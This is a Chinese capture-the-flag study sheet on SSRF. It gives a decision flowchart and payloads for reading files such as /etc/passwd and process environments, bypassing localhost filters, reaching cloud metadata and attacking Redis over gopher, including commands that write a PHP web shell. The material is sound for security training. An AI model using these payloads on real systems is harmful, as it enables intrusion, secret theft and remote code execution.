---
title: "SSRF 题型总分类与排查流程"
description: "围绕题型判断、协议探测、文件读取与内网访问的 SSRF 分析清单。"
order: 2
---

# 🧠 一、SSRF 题型总分类（先判断类型）

拿到题目第一步，不是乱试，而是判断题型。

```
┌── 是否有回显？
│
├── 有回显  → 显式 SSRF
│
└── 无回显  → Blind SSRF
```

------

# 🗺 二、完整 SSRF 作战流程图

完整逻辑树：

```
开始
  │
  ├── ① 是否可控 URL？
  │        │
  │        └── 确认是否真的服务器发请求
  │                │
  │                ├── 请求公网测试（burp collaborator / dnslog）
  │                └── 看是否返回内容
  │
  ├── ② 判断是否支持哪些协议？
  │        │
  │        ├── http
  │        ├── https
  │        ├── file
  │        ├── gopher
  │        ├── dict
  │        └── ftp
  │
  ├── ③ 是否支持 file:// ？
  │        │
  │        ├── YES → 直接进入 LFI 模式（优先级最高🔥）
  │        │         │
  │        │         ├── 读 /etc/passwd
  │        │         ├── 读 /proc/self/environ
  │        │         ├── 读 /proc/self/cmdline
  │        │         ├── 猜 flag 路径
  │        │         └── 读源码找 flag
  │        │
  │        └── NO → 进入内网探测
  │
  ├── ④ 内网探测
  │        │
  │        ├── 127.0.0.1
  │        ├── 127.0.0.1:常见端口
  │        ├── 172.17.0.1（docker）
  │        ├── 169.254.169.254（云）
  │        └── 10.x.x.x
  │
  ├── ⑤ 扫端口
  │        │
  │        ├── 80
  │        ├── 5000（Flask）
  │        ├── 8000
  │        ├── 8080
  │        ├── 8888
  │        ├── 6379（Redis）
  │        ├── 2375（Docker）
  │        └── 9200（ES）
  │
  ├── ⑥ 是否有过滤？
  │        │
  │        ├── 禁止 127.0.0.1？
  │        │      ├── 2130706433
  │        │      ├── 0x7f000001
  │        │      ├── 0177.0.0.1
  │        │      └── 127.1
  │        │
  │        ├── 禁止 localhost？
  │        │      └── 127.1 / 内网IP
  │        │
  │        └── DNS 检查？
  │               └── DNS Rebinding
  │
  ├── ⑦ 是否支持 gopher？
  │        │
  │        ├── YES → 打 Redis / FastCGI / Docker
  │        └── NO  → 尝试 HTTP API
  │
  ├── ⑧ 打内部服务
  │        │
  │        ├── Redis 未授权
  │        ├── Docker Remote API
  │        ├── Flask debug
  │        ├── Spring Actuator
  │        └── Kubernetes API
  │
  └── ⑨ 拿 flag
```

------

# 三、比赛专用 SSRF 快速检查清单

拿到题后按顺序打：

------

## 🔥 第一步：协议探测（30秒）

```
http://127.0.0.1
file:///etc/passwd
gopher://127.0.0.1:6379
```

只看支持哪些协议。

如果：

- 支持 file → 直接进入读文件模式
- 支持 gopher → 进入高阶模式
- 只有 http → 内网 Web 模式

------

## 🔥 第二步：是否支持 file（优先级最高）

如果支持：

```
file:///etc/passwd
file:///proc/self/cmdline
file:///proc/self/environ
file:///proc/1/cgroup
```

### 判断环境：

| 文件    | 用途         |
| ------- | ------------ |
| cmdline | 启动程序路径 |
| environ | 环境变量     |
| cgroup  | 是否 docker  |
| mounts  | 容器挂载     |

------

### 比赛技巧：

很多题 flag 在：

```
/flag
/app/flag
/root/flag
```

你要优先打：

```
file:///flag
```

别浪费时间猜路径。

------

# 三、如果不支持 file → 内网打法

## 1️⃣ 端口扫描思维

优先扫：

```
127.0.0.1:5000
127.0.0.1:8000
127.0.0.1:8080
127.0.0.1:8888
```

因为：

- Flask 常用 5000
- Node 常用 3000
- Java 常用 8080

------

## 2️⃣ 扫 docker 网桥

```
172.17.0.1
172.18.0.1
```

很多题 flag 在容器外。

------

## 3️⃣ 云题必测

```
169.254.169.254
```

如果打通 metadata：

直接起飞。

------

# 四、比赛高阶：gopher 利用

如果支持 gopher，这题分值不会低。

常见目标：

| 服务      | 端口  |
| --------- | ----- |
| Redis     | 6379  |
| Docker    | 2375  |
| FastCGI   | 9000  |
| Memcached | 11211 |

------

## 🔥 Redis 打法比赛流程

### 1️⃣ 测试是否未授权

```
gopher://127.0.0.1:6379/_INFO%0d%0a
```

### 2️⃣ 如果成功 → 写文件

利用：

```
CONFIG SET dir /var/www/html
CONFIG SET dbfilename shell.php
SET x "<?php system($_GET['cmd']); ?>"
SAVE
```

比赛中要会手写 payload。

------

# 五、Blind SSRF 比赛打法

如果没有回显：

### 1️⃣ DNS 外带

用 dnslog：

```
http://xxxx.dnslog.cn
```

### 2️⃣ 时间延迟判断

访问：

```
http://127.0.0.1:22
```

看响应时间。

------

# 六、比赛中 SSRF 三大常见出题套路

------

## 🥇 套路一：SSRF + LFI（送分）

支持 file。

目标：读 flag。

------

## 🥈 套路二：SSRF + 内网 Flask

80 端口正常
5000 端口有 /flag

------

## 🥉 套路三：SSRF + Redis

gopher 可用
需要构造 payload

------

# 七、比赛实战技巧（非常重要）

### 1️⃣ 看 Docker 特征

```
file:///proc/1/cgroup
```

如果看到 docker：

说明可能逃逸。

------

### 2️⃣ 看启动路径

```
file:///proc/self/cmdline
```

可以直接知道源码路径。

------

### 3️⃣ 看环境变量

```
file:///proc/self/environ
```

很多题 flag 在环境变量。

------

# 八、真正比赛进阶路线

如果你想提升到强队水平，你要会：

- 手写 gopher payload
- 手动构造 FastCGI
- Redis 主从利用
- Docker API 逃逸
- Kubernetes API 利用

------

